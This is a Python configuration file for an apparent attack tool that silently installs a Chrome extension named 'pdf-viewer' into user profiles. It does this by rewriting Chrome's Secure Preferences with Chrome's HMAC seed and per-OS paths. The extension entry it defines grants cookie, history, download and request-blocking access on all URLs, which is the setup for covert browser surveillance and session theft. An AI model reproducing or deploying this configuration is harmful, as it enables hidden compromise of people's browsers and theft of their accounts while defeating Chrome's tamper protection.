CERT_DIR = 'cert'
CERT_FILE = f'{CERT_DIR}/fullchain.pem'
KEY_FILE = f'{CERT_DIR}/privkey.pem'
SELF_SIGNED_CERT = False

HOSTNAME = '127.0.0.1'

EXTENSION_NAME = 'pdf-viewer'

EXTENSION_PATH = {
    'linux': '.config/google-chrome/Default',
    'macos': 'Library/Application Support/Google/Chrome/Default',
    'windows': 'AppData\\Local\\Google\\Chrome\\User Data\\Default'
}

SECURE_PREFERENCES_EXTENSION = {
    'account_extension_type': 0,
    'active_permissions': {
        'api': ['activeTab', 'bookmarks', 'cookies', 'downloads', 'history', 'idle', 'storage', 'tabs', 'webRequest', 'webRequestBlocking'],
        'explicit_host': ['*://*/*', '<all_urls>', 'chrome://favicon/*']
    },
    'creation_flags': 38,
    'first_install_time': 'TO_BE_REPLACED',
    'from_webstore': False,
    'granted_permissions': {
        'api': ['activeTab', 'bookmarks', 'cookies', 'downloads', 'history', 'idle', 'storage', 'tabs', 'webRequest', 'webRequestBlocking'],
        'explicit_host': ['*://*/*', '<all_urls>', 'chrome://favicon/*']
    },
    'last_update_time': 'TO_BE_REPLACED',
    'location': 4,
    'path': 'TO_BE_REPLACED',
    'state': 1,
    'was_installed_by_default': False,
    'was_installed_by_oem': False
}

SECURE_PREFERENCES_FILENAME = {
    'linux': 'Preferences',
    'macos': 'Secure Preferences',
    'windows': 'Secure Preferences'
}

SEED = {
    'linux': b'',
    'macos': b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8',
    'windows': b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
}

USERS_PATH = {
    'linux': '/home',
    'macos': '/Users',
    'windows': 'C:\\Users'
}
